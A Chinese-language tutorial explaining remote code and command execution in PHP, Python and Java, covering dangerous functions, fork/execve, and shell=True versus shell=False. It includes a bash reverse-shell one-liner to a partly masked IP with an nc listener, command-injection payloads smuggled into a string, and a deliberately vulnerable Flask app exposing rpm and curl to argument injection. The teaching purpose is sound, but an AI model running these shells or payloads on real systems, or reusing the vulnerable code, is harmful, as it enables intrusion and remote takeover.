## 浅谈RCE

**Remote Code Execute**（远程代码执行）：

一句话概括：一段当前语言代码的字符串被动态执行，或者其他语言的代码被沙箱执行。

**php：**

php中可以进行远程代码执行的函数有很多，也常常被一些webshell来做免杀利用。如果我们的输入可以走到以下的函数作为参数，那么就有可能有远程代码执行。

```php
eval()  //把字符串作为PHP代码执行

assert()  //检查一个断言是否为 FALSE，可用来执行代码

preg_replace()  //执行一个正则表达式的搜索和替换

call_user_func()  //把第一个参数作为回调函数调用

call_user_func_array()  //调用回调函数，并把一个数组参数作为回调函数的参数

array_map()  //为数组的每个元素应用回调函数

$a($b)  //动态函数
```

**python：**

python中能进行代码执行的函数也不多。如果我们的输入可以走到以下的函数作为参数，那么就有可能有远程代码执行。

```python
exec(string)   # Python代码的动态执行
eval(string)    # 返回表达式或代码对象的值
execfile(string)    #从一个文件中读取和执行Python脚本
```

**java：**
java中能够直接执行代码的函数基本没有，都是调用反序列化来动态执行字符串。所以这里暂时没有。



**Remote Command Execute**（远程命令执行）：

一句话概括：就是一段输入的字符串被引入了执行外部命令的函数，并且没过过滤

**php：**

```php
exec - 执行一个外部程序

passthru - 执行外部程序并且显示原始输出

proc_open - 执行一个命令，并且打开用来输入/输出的文件指针。

shell_exec - 通过 shell 执行命令并将完整的输出以字符串的方式返回

system -执行外部程序，并且显示输出
```

**python：**

```python
os.system()   #执行系统指令
os.popen()   #popen()方法用于从一个命令打开一个管道subprocess.call #执行由参数提供的命令
```

**java：**

```java
Runtime.getRuntime().exec()
ProcessBuilder()
```

**shell相关知识**

https://www.jianshu.com/p/410cd35e642f

*管道符：*

command1 | command2  前一个命令的输出作为后一个命令的输入

*重定向:*

command1 < input.txt  将input.txt的文本的内容作为command1的参数

command2 > out.txt  将command2的输出结果输出到out.txt里面 

*反弹shell：*

```
bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1 //受害者

nc -lvvp 2333//攻击者
```

**命令解释：**

![image-20240221182027234](https://raw.githubusercontent.com/ljqalex/image/main/image-20240221182027234.png)

**Linux进程的创建**

这是**fork**创建子进程：

![image-20240221182154108](https://raw.githubusercontent.com/ljqalex/image/main/image-20240221182154108.png)

**这是execve和fork的区别：**

![image-20240221182700228](https://raw.githubusercontent.com/ljqalex/image/main/image-20240221182700228.png)

当执行命令的时候：

bash  -c  whoami 

其实在内核执行了下面的操作：

```
bash(pid:52351) --> sys_fork  --> bash(pid:52792) --> sys_execve  -->  /bin/whoami(pid:52793)
```

**strace**

strace：对系统的调用的跟进。

命令：

```
strace -tt -f -e trace=process python3 test.py
```

test.py：

```python
import os
if __name__ =='__main__':
    name ='123";ping baidu.com -c 10086;echo "456'
    cmd = 'echo "HELLO ' + name + '"'
    os .system(cmd)
```

![image-20240221184337322](https://raw.githubusercontent.com/ljqalex/image/main/image-20240221184337322.png)

大家便可以看到每个进程的调用情况（非常nice的命令！）

**python下面的subprocess的函数的使用：**

```python
import os
import subprocess
if __name__ =='__main__':
    name ='123";ping baidu.com -c 10086;echo "456'
    cmd = 'echo "HELLO ' + name + '"'
    subprocess.call(cmd,shell=True)
```

```python
import os
import subprocess
if __name__ =='__main__':
    name ='123";ping baidu.com -c 10086;echo "456'
    cmd = 'echo "HELLO ' + name + '"'
    subprocess.call(cmd,shell=False)
```

这两段函数的区别在于**是否启用shell**

如果 shell=True，则在新的进程中使用 shell 来执行命令。这意味着你可以使用 shell 的功能，如管道、重定向等，，，，
如果 shell=False，则在新的进程中不使用 shell，命令将会直接被执行而不经过 shell 解释器。这样更安全，但是一些 shell 的特性可能无法使用，如管道、重定向等



***那什么是shell：***

一种是直接执行系统内置的命令或可执行程序，比如ls、cd、grep等。这些命令是由操作系统提供的，我们可以直接在终端中调用它们来执行对应的功能。
另一种是执行由用户自定义的脚本或程序，这些脚本通常是用Shell脚本编写的，称为Shell命令。Shell命令不是独立的可执行程序，而是一系列操作系统命令和控制结构的组合，通常运行在一个解释器中（比如Bash）

**命令注入究竟在注入什么：**


我们先思考下面一段伪代码

```php
var name = requset.get("name")
var cmd="echo 'Hello " + name + "'"
RUN_CMD(cmd)
```

很简单，就是获取一个外部输入，进行简单的拼接，最终放入一个执行外部命令的函数中去执行。这里显然存在一个RCE(远程命令执行)

但是，我的重点不是这里是否有RCE漏洞。而是

```
1.上面我们提到的命令执行的函数，都一定存在这个rce吗?
2.如果不一定存在RCE，它们之间的差别是什么?
```

**php：**

```php+HTML
<?php
$name = $_GET['name'];
$cmd = 'echo "Hello '.$name.'"';
var_dump("system".system($cmd));//sh-c
echo '</br>';
var_dump("exec",exec($cmd)); //sh -c
echo '</br>';
var_dump("shell_exec".shell_exec($cmd));//sh -c
echo '</br>';
var_dump("popen");$x= popen($cmd, 'r');var_dump($x);var_dump(fread($x,1024));//sh -c
echo '</br>';
$a = array();
var_dump("proc_open");$x=proc_open($cmd, $a,$b); //sh -c
?>
```

php中大多数执行外部命令的函数，其实都是调用sh-c 去执行

**python：**

```python
import os
if __name__ =='__main__':
    name ='123";ping baidu.com -c 10086;echo "456'
    cmd = 'echo "HELLO ' + name + '"'
    os.system(cmd) #sh -c
```

**java（Runtime.getRuntime().exec()）：**

```java
String command = "ls -l";
Process process = Runtime.getRuntime().exec(command);

BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
String line;
while ((line = reader.readLine()) != null) {
    System.out.println(line);
}
```

**java（ProcessBuilder）**

```java
String command = "ls";
ProcessBuilder processBuilder = new ProcessBuilder(command);
Process process = processBuilder.start();

BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
String line;
while ((line = reader.readLine()) != null) {
    System.out.println(line);
}
```

**system类**
如果是执行system函数，或者类似system函数，他们都是直接走的fork-->execve流程(调用外部sh -c)，这种情况下，我们的输入被拼接加入到作为bash -c的参数，而bash -c是支持shell语法的，所以我们能够很轻易的进行拼接、绕过，这种也是最常见的RCE攻击，简单的一笔。

**execve类**
比如Runtime.getRuntime().exec()和subprocess.call(cmd,shell=False)这两者，走的流程是直接execve，在这种情况下，我们的输入只能作为固定进程的参数，那么我们就没办法用shell语法了，与任何拼接都没有关系了。这种情况怎么绕过呢?



**参数黑魔法：**

当我们不能执行任意进程的时候(我们的输入只是某个特定进程的输入的时候)依然能找到-些撸点，但是撸点的大小，取决的使用的进程程序本身的参数是不是能注入。
这是一个具体的案例，**curl**可以进行文件读取（https://www.cnblogs.com/zhanglianghhh/p/11326428.html）

这是一个读取的脚本文件：

```python
import shlex
import subprocess
import urllib

from flask import Flask, request

app = Flask(__name__)


@app.route('/rpm')
def rpm_install():  # put application's code here
    rpm = request.args.get("rpm")
    if rpm is None or rpm.strip() == "":
        return "please input rpm to install"
    rpm = urllib.parse.unquote(rpm)
    cmd = "rpm " + rpm
    cmd_list = shlex.split(cmd)
    process = subprocess.Popen(cmd_list, shell=False, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                               stderr=subprocess.STDOUT)
    result = "result is:\n"
    while process.poll() is None:
        line = process.stdout.readline()
        line = line.strip()
        if line:
            result = result + str(line)

    return result


@app.route('/curl')
def curl():  # put application's code here
    url = request.args.get("url")
    if url is None or url.strip() == "":
        return "please input url"
    cmd = ['curl', url]
    process = subprocess.Popen(cmd, shell=False, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                               stderr=subprocess.STDOUT)
    result = "result is:\n"
    while process.poll() is None:
        line = process.stdout.readline()
        line = line.strip()
        if line:
            result = result + str(line)

    return result


if __name__ == '__main__':
    app.run(host="0.0.0.0")
```

```
这段代码实现了一个简单的 Flask 应用，可以通过两个不同的路由来执行 rpm 安装和 curl 命令，并返回执行结果。具体作用如下：
/rpm 路由：通过传递 rpm 参数来执行 rpm 安装命令。用户可以在浏览器访问 /rpm?rpm <rpm_package_name>，替换 <rpm_package_name> 为要安装的 RPM 包名，然后该应用会执行对应的 rpm 安装命令，并返回安装结果。
/curl 路由：通过传递 url 参数来执行 curl 命令。用户可以在浏览器访问 /curl?url=<url>，替换 <url> 为要获取内容的 URL，然后该应用会执行 curl 命令去获取该 URL 的内容，并返回结果。
因此，代码实现了一个简单的远程命令执行服务，允许用户通过浏览器访问不同的路由来执行特定的命令，并获取命令执行的结果
```

